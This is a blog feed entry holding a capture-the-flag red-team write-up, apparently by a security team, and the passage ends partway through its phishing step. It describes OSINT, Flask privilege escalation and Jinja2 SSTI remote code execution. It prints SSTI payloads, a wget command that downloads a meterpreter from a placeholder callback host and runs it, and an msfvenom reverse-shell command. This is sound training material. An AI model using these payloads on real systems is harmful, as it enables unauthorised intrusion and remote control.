<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.2.1">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2021-10-27T23:01:23+02:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">FRPLab Blog</title><subtitle>FRPLAB is a cyber security team working in Thales. Our activies include Forensic, Reverse engineering and Penetration testing.</subtitle><entry><title type="html">[ECW] Red Team Challenge Write Up</title><link href="http://localhost:4000/writeup/2021/10/27/ecw-red-team-challenge.html" rel="alternate" type="text/html" title="[ECW] Red Team Challenge Write Up" /><published>2021-10-27T19:30:59+02:00</published><updated>2021-10-27T19:30:59+02:00</updated><id>http://localhost:4000/writeup/2021/10/27/ecw-red-team-challenge</id><content type="html" xml:base="http://localhost:4000/writeup/2021/10/27/ecw-red-team-challenge.html">&lt;h1 id=&quot;red-team-by-zkclown-with-the-help-of-flolou&quot;&gt;Red Team By @ZkClown with the help of @Flolou&lt;/h1&gt;

&lt;h2 id=&quot;table-of-contents&quot;&gt;Table of Contents&lt;/h2&gt;
&lt;ol&gt;
  &lt;li&gt;&lt;a href=&quot;#intro&quot;&gt;Intro&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#the-initial-idea&quot;&gt;The initial idea&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#creation-of-each-step&quot;&gt;Creation of each step&lt;/a&gt;
    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#osint&quot;&gt;OSINT&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#web-application-pentest&quot;&gt;Web Application Pentest&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#phishing&quot;&gt;Phishing&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#ad-compromise&quot;&gt;AD Compromise&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#infrastucture&quot;&gt;Infrastucture&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#write-up-solution&quot;&gt;Write up (Solution)&lt;/a&gt;
    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#description&quot;&gt;Description&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#step-1---osint&quot;&gt;Step 1 - OSINT&lt;/a&gt;
        &lt;table style=&quot;margin: 0; width: 100%; border: none;&quot;&gt;
    &lt;tr style=&quot;border: none; padding: 0&quot;&gt;
       &lt;td style=&quot;border: none; padding: 0; width: 33.333%; vertical-align: top;&quot;&gt;
          &lt;ul&gt;
          &lt;li&gt;&lt;a href=&quot;#google&quot;&gt;Google&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#twitter&quot;&gt;Twitter&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#github&quot;&gt;GitHub&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#instagram&quot;&gt;Instagram&lt;/a&gt;&lt;/li&gt;
          &lt;/ul&gt;
       &lt;/td&gt;
       &lt;td style=&quot;border: none; padding: 0; width: 33.333%; vertical-align: top;&quot;&gt;
          &lt;ul&gt;
          &lt;li&gt;&lt;a href=&quot;#google-again&quot;&gt;Google again&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#linkedin&quot;&gt;LinkedIn&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#the-website&quot;&gt;The Website&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#fun-fact-malware-site&quot;&gt;Fun Fact: Malware site&lt;/a&gt;&lt;/li&gt;
          &lt;/ul&gt;
       &lt;/td&gt;
       &lt;td style=&quot;border: none; padding: 0; width: 33.333%; vertical-align: top;&quot;&gt;
          &lt;ul&gt;
          &lt;li&gt;&lt;a href=&quot;#fun-fact-collateral-damage&quot;&gt;Fun Fact: Collateral damage&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#this-hint-noone-found&quot;&gt;This Hint noone found&lt;/a&gt;&lt;/li&gt;
          &lt;/ul&gt;
       &lt;/td&gt;
    &lt;/tr&gt;
 &lt;/table&gt;
      &lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#step-2---web-application-pentest&quot;&gt;Step 2 - Web Application Pentest&lt;/a&gt;
        &lt;ul&gt;
          &lt;li&gt;&lt;a href=&quot;#intended-way-weak-acl&quot;&gt;Intended way: Weak ACL&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#unintended-way-cookie-flask-with-weak-secret&quot;&gt;Unintended way: Cookie Flask with weak secret&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#fun-fact-pranksters&quot;&gt;Fun Fact: Pranksters&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#ssti&quot;&gt;SSTI&lt;/a&gt;&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#step-3---phishing-some-hr&quot;&gt;Step 3 - Phishing some HR&lt;/a&gt;
        &lt;ul&gt;
          &lt;li&gt;&lt;a href=&quot;#pivot-with-the-web-app&quot;&gt;Pivot with the Web App&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#fun-fact-database-under-presure&quot;&gt;Fun Fact: Database under pressure&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#phishing-click-master&quot;&gt;Phishing Click Master&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#fun-fact-funny-emails-received&quot;&gt;Fun Fact: Funny emails received&lt;/a&gt;&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#step-4---ciso-here-i-come&quot;&gt;Step 4 - CISO here I come&lt;/a&gt;
        &lt;ul&gt;
          &lt;li&gt;&lt;a href=&quot;#recon-on-hr&quot;&gt;Recon on HR&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#fun-fact-where-is-the-lpe&quot;&gt;Fun Fact: Where is the LPE&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#zabbix&quot;&gt;Zabbix&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#fun-fact-omg-windef&quot;&gt;Fun Fact: OMG WinDef&lt;/a&gt;&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#conclusion&quot;&gt;Conclusion&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;intro&quot;&gt;Intro&lt;/h2&gt;

&lt;p&gt;For the European Cyber Week Challenge (ECW Challenge), I’ve created a challenge named Red Team divided in 4 steps. This blog post aims to present how this challenge was created and the purpose of each step of it. Also a write up on the solution will be presented at the end of the article with some fun facts during the challenge.&lt;/p&gt;

&lt;h2 id=&quot;the-initial-idea&quot;&gt;The initial idea&lt;/h2&gt;

&lt;p&gt;I wanted to create a challenge which simulate a realistic situation that we could have found in a Red Team operation. The initial goal of the challenge was to fully compromise a company (get domain administrator privileges as ultimate goal). To create the scenario I used different real world situation that I have encountered during different audit.&lt;br /&gt;
I divides my challenge in at least 4 steps:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;OSINT based on keyword to find out the entry point;&lt;/li&gt;
  &lt;li&gt;Web application pentest to reach a mail server which requires no authentication;&lt;/li&gt;
  &lt;li&gt;Phishing on the company to get foothold in the information system;&lt;/li&gt;
  &lt;li&gt;AD compromise (with no precise idea of how to).&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;However, since there was a risk that a challenger break all the challenge if we give DA privileges. I decided to never give admin privileges on compromise systems. So the last step of the challenge was to retrieve the NT hash of the target (Harold).
Now that the schema of the challenge has been made, I needed to think about “how to build each step”.&lt;/p&gt;

&lt;h2 id=&quot;creation-of-each-step&quot;&gt;Creation of each step&lt;/h2&gt;

&lt;h3 id=&quot;osint&quot;&gt;OSINT&lt;/h3&gt;

&lt;p&gt;As said previously, I wanted to create an OSINT part to make the challengers to find out the website to attack. However I didn’t want to do a guessing challenge like we can find in other CTF with this type of challenge. I wanted to create a straight forward challenge. The aim is to create a nice and funny universe, where challengers should not be frustrated to have to guess something.&lt;br /&gt;
First I wanted to use popular social medias:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Twitter (Eveyone in IT uses twitter)&lt;/li&gt;
  &lt;li&gt;Github (We often find interesting things in commits)&lt;/li&gt;
  &lt;li&gt;Instagram (Who does not like taking picture of himself with company information in the background)&lt;/li&gt;
  &lt;li&gt;Linkedin (Every company uses it, it was the natural last social to find out the web site)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Now that I had the path for my scenario, I needed to create a context. Since this year’s very very original ECW theme was medical (covid), I needed to create something related to it. As I am also a big cat lover, I imagined a company which creates medication for cats named PharmaHealthyCat. And to match the covid theme, it creates Covid vaccine for cats. \o/ I got my company.&lt;br /&gt;
Now I needed to find the target, the one who likes social media. I needed to find a face which challenger would directly find out that is not a real person. So I took the meme Harold.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/redteam/harold.jpg&quot; alt=&quot;Feel The pain&quot; /&gt;
Thanks to internet, I could have find out many images of him in different situation and clothes.&lt;/p&gt;

&lt;p&gt;I got everything, I started created the different account on the different social media account and make them to have a little activities:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Twitter: Tweet the github on first tweet, then create tweets and retweets so stupid stuff;&lt;/li&gt;
  &lt;li&gt;Github: Fork multiple projets. Find a project to use instagram. Fork it and create a config file with the Instagram account;&lt;/li&gt;
  &lt;li&gt;Instagram: Post picture of Harold and cats. Create a post with a picture which includes an open Word document with the company name. I needed to take the picture myself, so I asked someone to take me in picture in front of my computer.&lt;/li&gt;
  &lt;li&gt;Linkedin: Create multiple accounts for employees, create the company page with the link to the website.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;The purpose of this step was to show that even if people have nothing to hide, social medias can leak a lot of usefull data.&lt;/p&gt;

&lt;p&gt;Ok now, the first step is done.&lt;/p&gt;

&lt;h3 id=&quot;web-application-pentest&quot;&gt;Web Application Pentest&lt;/h3&gt;

&lt;p&gt;For this step, I needed to think about which vulnerability I wanted to use to create remote code execution. I thought about Server Side Template Injection (SSTI) as attack vector. But I didn’t want to make the feature reachable from an unauthenticated user nor a basic user. So I decided to add a vulnerability to escalate privileges on the application. The privilege escalation was supposed to be from a weak access control on the page which manages the users (the page needed to be found) and the feature which allows to change users’ privileges.&lt;br /&gt;
But since, I am a lazy developper I didn’t change the key used to sign the session cookie of the FLASK application. Therefore an other way to escalate privileges was to craft a cookie with ID 1 and sign it with the default key wich is … &lt;em&gt;key&lt;/em&gt;.&lt;br /&gt;
On the website, I needed to present the company, put employees pictures and ultimately put a hint which indicates to perform spear phishing on an employee. What else than the Human Ressources director as target ?&lt;/p&gt;

&lt;p&gt;The purpose of this step was to reach the internal SMTP server.&lt;/p&gt;

&lt;h3 id=&quot;phishing&quot;&gt;Phishing&lt;/h3&gt;

&lt;p&gt;For this step, multiple things were needed:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;SMTP server to send emails;&lt;/li&gt;
  &lt;li&gt;IMAP server to receive emails;&lt;/li&gt;
  &lt;li&gt;An Active Directory environment for the company;&lt;/li&gt;
  &lt;li&gt;A workstation with a script which opens email and open attachments.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;At the begining I wanted to simulate a real world situation. So at the begining I wanted to put on the workstation an antivirus (Windows Defender is good enough). And ultimately put a Firewall to prevent call backs on port other than 80, 443.&lt;br /&gt;
But since I knew that a lot of challengers would not find out spear phishing is needed to be performed for this step, I decided to remove firewall and antivirus. I know, I am a nice person =D .&lt;/p&gt;

&lt;p&gt;The purposes of this step were:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Pivot on the network of the web application server to reach internal services;&lt;/li&gt;
  &lt;li&gt;SMTP server/relay in companies can be found to not have authentication on it (oops);&lt;/li&gt;
  &lt;li&gt;Employees in companies can be click masters.&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;ad-compromise&quot;&gt;AD Compromise&lt;/h3&gt;

&lt;p&gt;For this step, I didn’t know what to do to compromise the Active Directory. But I was pretty sure about something: I am lazy boy.
So I decided to use Zabbix as a supervision solution. Companies often have stuff like this to monitor their information systems. But they also often activate remote code execution to perform custom checks on it (by default it is disabled). 
I needed to create a Linux server to host the zabbix service. I also needed to install Zabbix agents on the workstation and enable remote code execution on the target workstation. (I didn’t activate it on the HR workstation because it ran with SYSTEM rights and I did not want challengers to perform mimikatz on it).
I set up the agent to run as our target user to get his privileges when remote code execution is performed on his workstation.&lt;/p&gt;

&lt;p&gt;I wanted challengers to retrieve the NT hash to validate the challenge. However the question was “How to get the NT hash when you have remote code execution with our target context ?”.&lt;br /&gt;
The solution was to catch a NTLMv2 hash and break it due to a weak password (RockYou). And finally craft the NT hash from the plain text password.
The Zabbix was running with default credentials to access the remote code execution feature. I left the .msi used to install the agent on the Downloads folder of the HR machine to give a hint for challengers. Then they can read the configuration file of the Zabbix agent to retrieve the Zabbix server IP.&lt;/p&gt;

&lt;p&gt;The purposes of this step were:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Pivot can be performed through supervision tools (do not focus on classic Active Directory attacks);&lt;/li&gt;
  &lt;li&gt;Default credentials on internal applications;&lt;/li&gt;
  &lt;li&gt;Services often run with domain administrator privileges (even if on this scenario it was not the case);&lt;/li&gt;
  &lt;li&gt;Understand that Responder was not needed here since we have already code execution in a domain user context;&lt;/li&gt;
  &lt;li&gt;Weak passwords are often used in companies;&lt;/li&gt;
  &lt;li&gt;Know what a NT hash is.&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;infrastucture&quot;&gt;Infrastucture&lt;/h3&gt;

&lt;p&gt;For this challenge we used an ESXi to host our different virtual machines. This challenge required several VMs:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;1 firewall (pfSense) to configure the different networks and filter necessary flows;&lt;/li&gt;
  &lt;li&gt;1 Linux server to host docker need for web application, its database and the mail server;&lt;/li&gt;
  &lt;li&gt;1 Linux server to host Zabbix server;&lt;/li&gt;
  &lt;li&gt;2 Windows workstations (HR and Harold);&lt;/li&gt;
  &lt;li&gt;1 Domain Controller.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;I created 3 networks (VLANs) for this challenge:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;A DMZ to host (Web Server, Database, Mail Server);&lt;/li&gt;
  &lt;li&gt;Users VLAN (Workstations);&lt;/li&gt;
  &lt;li&gt;Servers (Zabbix server, Domain Controller)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;/assets/redteam/schema.png&quot; alt=&quot;Schema&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;write-up-solution&quot;&gt;Write up (Solution)&lt;/h2&gt;

&lt;h3 id=&quot;description&quot;&gt;Description&lt;/h3&gt;

&lt;p&gt;When we first connect on the challenge we have this message to introduce the challenge:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;The CSO of a famous company is looking for skilled hackers to join his team.&lt;/p&gt;

  &lt;p&gt;He sent the following challenge:&lt;/p&gt;

  &lt;p&gt;I setup a website to challenge your skill as a pentester&lt;br /&gt;
Find me over the Internet as I stand by the nickname &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Zer0DayH4ckz0r&lt;/code&gt;&lt;br /&gt;
If you reach my website you should be able to gain control of a server&lt;br /&gt;
You will then need to go deeper and find a pivot&lt;br /&gt;
Finally if your are good enough you will send me my own password as a NTLM hash&lt;br /&gt;&lt;br /&gt;
Good luck!&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;step-1---osint&quot;&gt;Step 1 - OSINT&lt;/h3&gt;

&lt;h4 id=&quot;google&quot;&gt;Google&lt;/h4&gt;

&lt;p&gt;Fist step of the challenge was to type &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Zer0DayH4ckz0r&lt;/code&gt; on our favorite search engine.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/redteam/google.png&quot; alt=&quot;Google&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We find a twitter account wich seems to correspond with the nickname.&lt;/p&gt;

&lt;h4 id=&quot;twitter&quot;&gt;Twitter&lt;/h4&gt;

&lt;p&gt;We scroll until we find out a tweet which gives his Github account.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/redteam/twitter.png&quot; alt=&quot;Twitter&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;github&quot;&gt;GitHub&lt;/h3&gt;

&lt;p&gt;On the Github activity, we can find out that he contributed on 1 project “instagram-terminal-news-feed”.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/redteam/github.png&quot; alt=&quot;Github&quot; /&gt;&lt;/p&gt;

&lt;p&gt;On the project we look at his commits.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/redteam/commit.png&quot; alt=&quot;commits&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Here we find the commit “Oops, removed credentials from repo”. We look at it.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/redteam/insta.png&quot; alt=&quot;insta&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Here we obtain 2 informations:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;his instagram account;&lt;/li&gt;
  &lt;li&gt;his instagram password.&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;instagram&quot;&gt;Instagram&lt;/h4&gt;

&lt;p&gt;We attempt to connect on instagram using his credentials. But it does not work. However the instagram account really exists. So we will take a look to its content.
We find the face for our target and it is Harold.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/redteam/instagram.png&quot; alt=&quot;instagram account&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We look at the pictures posted on the social media. We find an interesting picture.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/redteam/image.png&quot; alt=&quot;Interesting image&quot; /&gt;&lt;/p&gt;

&lt;p&gt;On the picture found on the Instagram. We can read on one screen &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Compte Rendu S...&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PharmaHealthyCat&lt;/code&gt;. OK, It smells better than a website which distributes malwares. Let’s google it.&lt;/p&gt;

&lt;h4 id=&quot;google-again&quot;&gt;Google again&lt;/h4&gt;

&lt;p&gt;&lt;img src=&quot;/assets/redteam/google2.png&quot; alt=&quot;Google&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;linkedin&quot;&gt;LinkedIn&lt;/h4&gt;

&lt;p&gt;We find linkedin account related to this name. Let’s take a look the Linkedin pages. By looking at one of this profile, we find a company page named &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PharmaHealthyCat&lt;/code&gt; like in the Instagram image.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/redteam/linkedin.png&quot; alt=&quot;Linkedin&quot; /&gt;&lt;/p&gt;

&lt;p&gt;On the company page, we can find a website https://phealthycat.org and our target (Harold) whose name is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Jean Luc Delafont&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/redteam/phealthy.png&quot; alt=&quot;Linkedin&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;the-website&quot;&gt;The Website&lt;/h4&gt;

&lt;p&gt;When accessing the web site, we have a short presentation of the company. We also get a piece of information that we will be needed later: the email address of the HR Lucie Bayard &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;lucie.bayard@phealthycat.org&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/redteam/endosint.png&quot; alt=&quot;Front page&quot; /&gt;
&lt;img src=&quot;/assets/redteam/flag1.png&quot; alt=&quot;flag 1&quot; /&gt;
By browsing the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Blog&lt;/code&gt;, we can find the flag in base64: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ECW{N1ckN4me_1s_G0Od_If_Y0u_D0n&apos;t_Thr0w}&lt;/code&gt;.&lt;/p&gt;

&lt;h4 id=&quot;fun-fact-malware-site&quot;&gt;Fun Fact: Malware site&lt;/h4&gt;

&lt;p&gt;Here some challengers looked at profiles of the users who liked the image.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/redteam/like.png&quot; alt=&quot;like&quot; /&gt;&lt;/p&gt;

&lt;p&gt;And by looking at the user &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;piratemonster1337&lt;/code&gt;. We find a website &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;monster.casa&lt;/code&gt; which allows users to download a malware. Some challengers attempted to scan the website in order to find vulnerabilities and some others attempted to reverse the malware thinking it was part of the challenger. 
This website appeared to have been DOS by some challengers due to the scans performed. RIP unknown man.&lt;/p&gt;

&lt;h4 id=&quot;fun-fact-collateral-damage&quot;&gt;Fun Fact: Collateral damage&lt;/h4&gt;

&lt;p&gt;Other challengers went a little offroad on Twitter users following our fake account and less malicious sites may have met a similar end …&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/redteam/slipped.jpeg&quot; alt=&quot;slipped&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/redteam/oops.jpeg&quot; alt=&quot;oops&quot; /&gt;&lt;/p&gt;

&lt;p&gt;When admins got aware of this information, a Discord message was sent to tell challengers that if they don’t find a flag on the website, it was probably the wrong one.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/redteam/admincall.png&quot; alt=&quot;Admin call&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;this-hint-noone-found&quot;&gt;This Hint noone found&lt;/h4&gt;

&lt;p&gt;During the tests of the challenge our tester told us the DNS entries for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;phealthycat.org&lt;/code&gt; pointed the mailer to our hosting provider (OVH). We then decided to configure the MX entry to point an internal IP address to give a hint where [not] to go next.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/redteam/robtex.png&quot; alt=&quot;Robtex mailer.phealthycat.org&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;step-2---web-application-pentest&quot;&gt;Step 2 - Web Application Pentest&lt;/h3&gt;

&lt;p&gt;The application allows users to create an account. For this Write-up, we will create an account named &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;writeup&lt;/code&gt;. &lt;br /&gt;
Once connected with our account, we have two solution to escalate our privileges:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Break the Flask cookie and craft a new one with an other ID which is admin;&lt;/li&gt;
  &lt;li&gt;Find the ACL flaw to become admin.&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;intended-way-weak-acl&quot;&gt;Intended way: Weak ACL&lt;/h4&gt;

&lt;p&gt;The intended way was to access the endpoint &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/home/users&lt;/code&gt;. With a little directory discovery, we can easily find this endpoint.
On this page, we can see the list of all users with a “disabled” button &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Change Privileges&lt;/code&gt;. We look for our user and click on the button after removing the HTML attribute &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;disabled&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/redteam/users.png&quot; alt=&quot;Users&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We are now admin and have access to new features. Particulary the feature &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Template builder&lt;/code&gt;. Smell the SSTI here.&lt;/p&gt;

&lt;h4 id=&quot;unintended-way-cookie-flask-with-weak-secret&quot;&gt;Unintended way: Cookie Flask with weak secret&lt;/h4&gt;

&lt;p&gt;An other possibity was to break the flask cookie due to a weak secret key (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;key&lt;/code&gt;). OOPS. With that secret, we can change and reforge our cookie and take the ID of an admin user.&lt;/p&gt;

&lt;h4 id=&quot;fun-fact-pranksters&quot;&gt;Fun Fact: Pranksters&lt;/h4&gt;

&lt;p&gt;A challenger sent me a DM on Discord, wondering if his method was intended. He sent with his real email address an email to Lucie Bayard, and became admin. Unfortunantly for him, an other challenger put him admin. Therefore he thought that was the solution until someone rolled-back his privileges. RIP.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/redteam/privesclol.png&quot; alt=&quot;LOL&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;ssti&quot;&gt;SSTI&lt;/h4&gt;

&lt;p&gt;Now that we can access the template feature, we can perform some remote code execution. 
&lt;img src=&quot;/assets/redteam/template.png&quot; alt=&quot;ssti&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Here again there were two ways:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Easy way: use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;TemplateReference&lt;/code&gt; object to call the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;os.system&lt;/code&gt;;
The payload using TemplateReference:&lt;br /&gt;
&lt;!--  --&gt;
&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;{{ self._TemplateReference__context.cycler.__init__.__globals__.os.system(&quot;CMD&quot;) }}&lt;/code&gt;
&lt;!--  --&gt;&lt;/li&gt;
  &lt;li&gt;Hard way: use object introspection to find &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;subprocess.popen&lt;/code&gt; method.
For the hard way, we enumerate the subclasses to find the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;subprocess.popen&lt;/code&gt; method.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;/assets/redteam/SSTIIntend.png&quot; alt=&quot;ssti&quot; /&gt;
&lt;img src=&quot;/assets/redteam/SSTIIntend2.png&quot; alt=&quot;ssti&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We sort all the classes and method to find the offset of our method. It appears to be the offset &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;418 - 1&lt;/code&gt; (array start at 0).
&lt;!--  --&gt;
Therefore by calling &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;{{ ().__class__.__bases__[0].__subclasses__()[417](&quot;CMD&quot;) }}&lt;/code&gt; we obtain the popen method to perform arbitrary command.
&lt;!--  --&gt;
Now that we have a RCE on the application, we now want a shell. For that, we’ll make the application to download a meterpreter and execute it.&lt;/p&gt;

&lt;p&gt;The payload will be: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cd /tmp &amp;amp;&amp;amp; wget http://&amp;lt;CALLBACK_IP&amp;gt;/meter.elf &amp;amp;&amp;amp; chmod +x /tmp/meter.elf &amp;amp;&amp;amp; /tmp/meter.elf&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;To craft the meterpreter I used: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;msfvenom -p linux/x64/meterpreter/reverse_tcp -f elf -a x64 LHOST=&amp;lt;CALLBACK_IP&amp;gt; LPORT=PORT &amp;gt; meter.elf&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/redteam/meterpreter.png&quot; alt=&quot;meterpreter&quot; /&gt;
&lt;img src=&quot;/assets/redteam/meterpreterCallBack.png&quot; alt=&quot;meterpreter callback&quot; /&gt;
Now we can navigate to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/app&lt;/code&gt; to retrieve the flag &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ECW{EaSy_P4rt_D0ne_C0ngratz}&lt;/code&gt;.
&lt;img src=&quot;/assets/redteam/flag2.png&quot; alt=&quot;flag2&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;step-3---phishing-some-hr&quot;&gt;Step 3 - Phishing some HR&lt;/h3&gt;

&lt;h4 id=&quot;pivot-with-the-web-app&quot;&gt;Pivot with the web app&lt;/h4&gt;

&lt;p&gt;Now we have a shell on the application, we now have to find out what to do. After some enumeration, we realise we are in a docker container (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/.dockerenv&lt;/code&gt;) and that we can’t privesc on the machine. So we will perform a network scan using ping.&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;for i in `seq 1 100`; do ping -c 1 -w 1 172.19.0.$i;done
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;/assets/redteam/pingScan.png&quot; alt=&quot;pingScan&quot; /&gt;
We observe the following IP addresses:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;172.19.0.1 (We assume that is the docker gateway);&lt;/li&gt;
  &lt;li&gt;172.19.0.2 (We are here);&lt;/li&gt;
